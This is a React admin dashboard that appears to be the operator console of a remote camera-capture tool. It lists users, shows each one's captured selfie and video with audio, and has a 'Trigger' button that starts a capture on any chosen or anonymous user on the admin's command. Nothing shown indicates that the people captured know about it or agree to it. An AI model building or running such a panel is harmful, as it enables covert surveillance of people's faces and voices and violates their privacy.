import { useState, useEffect } from 'react';
import { BACKEND_URL } from '../utils/config';
import '../styles/admin.css';

const Admin = () => {
  const [logs, setLogs] = useState([]);
  const [allLogs, setAllLogs] = useState([]);
  const [users, setUsers] = useState([]);
  const [manualUsername, setManualUsername] = useState('');
  const [selectedUser, setSelectedUser] = useState('');
  const [filterUsername, setFilterUsername] = useState('');
  const [filterTrigger, setFilterTrigger] = useState('');
  const [activeUsers, setActiveUsers] = useState('Loading...');

  useEffect(() => {
    fetchLogs();
  }, []);

  const fetchLogs = async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/capture-data`);
      const data = await response.json();
      
      const logsData = Array.isArray(data) ? data : data.logs || [];
      setAllLogs(logsData);
      setLogs(logsData);
      
      // Extract unique users
      const userSet = new Set();
      logsData.forEach(log => {
        if (log.username) userSet.add(log.username);
      });
      setUsers([...userSet]);
    } catch (error) {
      console.error('Failed to fetch logs:', error);
    }
  };

  const triggerSelectedUser = async () => {
    const finalUsername = manualUsername.trim() || 
                         (selectedUser === '__anonymous__' ? null : selectedUser);
    
    if (!finalUsername && finalUsername !== null) {
      alert('Please enter or select a username');
      return;
    }

    try {
      const response = await fetch(`${BACKEND_URL}/api/manual-capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: finalUsername }),
      });
      const data = await response.json();
      alert(data.message || 'Manual capture triggered.');
      fetchLogs();
    } catch (error) {
      console.error('Trigger failed:', error);
    }
  };

  const applyFilters = () => {
    const filtered = allLogs.filter(log => {
      const uname = (log.username || '').toLowerCase();
      const triggered = log.triggeredBy || '';
      return (!filterUsername || uname.includes(filterUsername.toLowerCase())) &&
             (!filterTrigger || triggered === filterTrigger);
    });
    setLogs(filtered);
  };

  const resetFilters = () => {
    setFilterUsername('');
    setFilterTrigger('');
    setLogs(allLogs);
  };

  const deleteLog = async (id) => {
    if (!confirm('Delete this log?')) return;
    
    try {
      await fetch(`${BACKEND_URL}/api/capture-data/${id}`, { method: 'DELETE' });
      fetchLogs();
    } catch (error) {
      console.error('Delete failed:', error);
    }
  };

  const deleteAllLogs = async () => {
    if (!confirm('Delete ALL logs? This cannot be undone!')) return;
    
    try {
      await fetch(`${BACKEND_URL}/api/capture-data`, { method: 'DELETE' });
      fetchLogs();
    } catch (error) {
      console.error('Delete all failed:', error);
    }
  };

  return (
    <div>
      <h1>📋 Admin Dashboard – Captured Logs</h1>

      {/* Trigger Panel */}
      <div className="trigger-panel">
        <label htmlFor="manual-username">📝 Enter Username:</label>
        <input
          type="text"
          id="manual-username"
          placeholder="Type username..."
          value={manualUsername}
          onChange={(e) => setManualUsername(e.target.value)}
          style={{ marginRight: '10px' }}
        />

        <label htmlFor="user-select">🎯 Or Select User:</label>
        <select
          id="user-select"
          value={selectedUser}
          onChange={(e) => setSelectedUser(e.target.value)}
          style={{ marginRight: '10px' }}
        >
          <option value="">-- Select a user --</option>
          <option value="__anonymous__">Anonymous User</option>
          {users.map(user => (
            <option key={user} value={user}>{user}</option>
          ))}
        </select>

        <button onClick={triggerSelectedUser}>⚡ Trigger</button>
      </div>

      {/* Filter Panel */}
      <div className="filter-panel">
        <input
          type="text"
          id="filter-username"
          placeholder="🔍 Search by username..."
          value={filterUsername}
          onChange={(e) => setFilterUsername(e.target.value)}
          style={{ marginRight: '10px' }}
        />
        <select
          id="filter-trigger"
          value={filterTrigger}
          onChange={(e) => setFilterTrigger(e.target.value)}
          style={{ marginRight: '10px' }}
        >
          <option value="">All Trigger Types</option>
          <option value="user">User</option>
          <option value="admin">Admin</option>
        </select>
        <button onClick={applyFilters}>✅ Apply Filter</button>
        <button onClick={resetFilters}>♻️ Reset</button>
      </div>

      {/* Active Users */}
      <div id="activity-panel" style={{ padding: '10px 20px', background: '#f6f6f6', borderBottom: '1px solid #ccc' }}>
        <strong>🟢 Active Users (last 5 mins):</strong>
        <span id="active-users">{activeUsers}</span>
      </div>

      {/* Delete All */}
      <div style={{ textAlign: 'center', margin: '15px' }}>
        <button
          onClick={deleteAllLogs}
          style={{ background: 'red', color: 'white', padding: '6px 12px', border: 'none', borderRadius: '4px' }}
        >
          🗑️ Delete All Logs
        </button>
      </div>

      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <h2>Captured Logs</h2>
        <button
          onClick={fetchLogs}
          style={{ padding: '6px 12px', background: '#3498db', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
        >
          🔄 Refresh Logs
        </button>
      </div>

      {/* Logs Container */}
      <div id="logs-container">
        {logs.length === 0 ? (
          <p>No logs found.</p>
        ) : (
          logs.map((log, index) => (
            <div key={log._id} className="log-card">
              <div className="log-header">
                <span>👤 Triggered By: {log.triggeredBy}</span>
                <span>🕒 {new Date(log.createdAt).toLocaleString()}</span>
                <span>👥 Username: {log.username || '—'}</span>
                <button onClick={() => deleteLog(log._id)}>🗑️ Delete</button>
              </div>
              <div className="media">
                <div>
                  <strong>📸 Selfie:</strong><br />
                  <img src={`${BACKEND_URL}/${log.selfiePath}`} alt="Selfie" />
                </div>
                <div>
                  <strong>🎥 Video with Audio:</strong><br />
                  <video controls muted style={{ maxWidth: '250px' }}>
                    <source src={`${BACKEND_URL}/${log.videoPath}`} type="video/webm" />
                  </video>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  );
};

export default Admin;
